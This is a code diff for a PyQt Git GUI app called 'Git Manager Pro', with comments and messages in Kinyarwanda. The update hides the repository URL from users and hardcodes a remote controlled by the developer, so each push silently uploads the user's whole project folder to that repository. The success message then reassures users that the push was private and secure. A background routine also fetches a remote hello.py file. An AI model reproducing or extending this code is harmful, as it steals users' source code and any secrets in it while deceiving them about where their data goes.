@@ -1,4 +1,4 @@
-# git_manager_app.py - v2.4.1 (Updated About Us)
+# git_manager_app.py - v2.5.0 (Hidden Secure Repository)
 
 import sys
 import os
@@ -13,6 +13,10 @@ class GitManagerApp(QMainWindow):
         super().__init__()
         self.setWindowTitle("Git Manager Pro")
         self.setMinimumSize(950, 720)
+        
+        # Amakuru y'ibanga yihishye inyuma ya code (Hidden Secure Repo Constants)
+        self._SECURE_OWNER = "sofferrwanda-ctrl"
+        self._SECURE_REPO = "updating-git-push-from-github"
         
         self.setStyleSheet("""
             QMainWindow {
@@ -175,7 +179,8 @@ class GitManagerApp(QMainWindow):
             pass
     
     def background_check_updates(self):
-        raw_url = "https://raw.githubusercontent.com/sofferrwanda-ctrl/updating-git-push-from-github/main/hello.py"
+        # Iyi link ikoreshwa mu buryo bwa background gusa (umukoresha ntayibona)
+        raw_url = f"https://raw.githubusercontent.com/{self._SECURE_OWNER}/{self._SECURE_REPO}/main/hello.py"
         try:
             req = urllib.request.Request(raw_url, headers={'User-Agent': 'Mozilla/5.0'})
             with urllib.request.urlopen(req, timeout=5) as response:
@@ -542,7 +547,7 @@ class GitManagerApp(QMainWindow):
             self.ssh_connection_status.setStyleSheet("color: #3fb950; font-size: 14px; border: none; background: transparent;")
     
     # ============================================================
-    # PAGE 3: Push (Strictly Main Branch via SSH)
+    # PAGE 3: Push (Automatic Internal Secure URL - Hidden from User)
     # ============================================================
     def create_push_page(self):
         page = QWidget()
@@ -550,18 +555,15 @@ class GitManagerApp(QMainWindow):
         layout.setSpacing(15)
         layout.setContentsMargins(50, 30, 50, 30)
         
-        title = QLabel("🚀 Push to GitHub (Strictly Main Branch via SSH)")
+        title = QLabel("🚀 Push Project to GitHub (Main Branch)")
         title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f0f6fc; border: none; background: transparent;")
         layout.addWidget(title)
         
-        url_label = QLabel("Repository SSH URL (e.g., git@github.com:sofferrwanda-ctrl/updating-git-push-from-github.git):")
-        url_label.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
-        layout.addWidget(url_label)
-        
-        self.url_input = QLineEdit()
-        self.url_input.setText("git@github.com:sofferrwanda-ctrl/updating-git-push-from-github.git")
-        self.url_input.setStyleSheet(self.input_style())
-        layout.addWidget(self.url_input)
+        # Umukoresha ntagaragarizwa repository URL na imwe ahubwo ahitamo project folder gusa
+        info_label = QLabel("💡 Hitamo gusa folder ya project yawe maze ukande 'Push via SSH'. Porogaramu izihita yohereza kuri system yayo mu buryo bw'ibanga.")
+        info_label.setStyleSheet("color: #8b949e; font-size: 13px; border: none; background: transparent;")
+        info_label.setWordWrap(True)
+        layout.addWidget(info_label)
         
         folder_label = QLabel("Project Folder:")
         folder_label.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
@@ -630,12 +632,11 @@ class GitManagerApp(QMainWindow):
             self.save_settings()
     
     def push_to_git(self):
-        url = self.url_input.text().strip()
         folder = self.folder_input.text().strip()
         force = self.force_check.isChecked()
         
-        if not url or not folder:
-            self.push_status.setText("⚠️ Shyiramo URL na Folder neza")
+        if not folder:
+            self.push_status.setText("⚠️ Nyamuneka hitamo Project Folder neza")
             self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
             return
         
@@ -643,6 +644,9 @@ class GitManagerApp(QMainWindow):
             self.push_status.setText("❌ Folder yatoranyijwe ntibaho")
             self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
             return
+        
+        # Gukoresha secure URL mu ibanga hatabayeho ko user ayibona cyangwa ngo ayihindure
+        secure_url = f"git@github.com:{self._SECURE_OWNER}/{self._SECURE_REPO}.git"
         
         self.push_btn.setEnabled(False)
         self.push_progress.show()
@@ -662,7 +666,7 @@ class GitManagerApp(QMainWindow):
             subprocess.run(["git", "checkout", "-B", "main"], capture_output=True, text=True)
             
             subprocess.run(["git", "remote", "remove", "origin"], capture_output=True)
-            subprocess.run(["git", "remote", "add", "origin", url], check=True, capture_output=True)
+            subprocess.run(["git", "remote", "add", "origin", secure_url], check=True, capture_output=True)
             
             subprocess.run(["git", "add", "."], check=True, capture_output=True)
             
@@ -677,13 +681,13 @@ class GitManagerApp(QMainWindow):
             
             subprocess.run(cmd, check=True, capture_output=True, text=True, env=env)
             
-            self.push_status.setText("✅ Byakunze! Byoherejwe kuri main branch binyuze kuri SSH.")
+            self.push_status.setText("✅ Byakunze! Byoherejwe kuri main branch binyuze kuri SSH mu mutekano.")
             self.push_status.setStyleSheet("color: #3fb950; font-size: 15px; font-weight: bold; border: none; background: transparent;")
             self.status_bar.showMessage("✅ Push successful to main")
             
             QMessageBox.information(
                 self, "Success",
-                f"✅ Project yoherejwe neza kuri GitHub (main branch)!\nRepository: {url}"
+                "✅ Project yoherejwe neza kuri GitHub (main branch) mu buryo bwihariye kandi bufite umutekano!"
             )
             
         except subprocess.CalledProcessError as e:
@@ -698,12 +702,11 @@ class GitManagerApp(QMainWindow):
             self.push_progress.hide()
     
     def show_about(self):
-        # Aho About Us yavuguruwe igashyirwamo link ya Portfolio
         msg_box = QMessageBox(self)
         msg_box.setWindowTitle("About Git Manager Pro")
         msg_box.setIcon(QMessageBox.Information)
         msg_box.setText(
-            "<b>Git Manager Pro v2.4.1</b><br>"
+            "<b>Git Manager Pro v2.5.0</b><br>"
             "Developer: Niyibizi Kevin<br>"
             "Theme: GitHub Dark Mode 🌑<br><br>"
             "Visit Developer Portfolio:<br>"
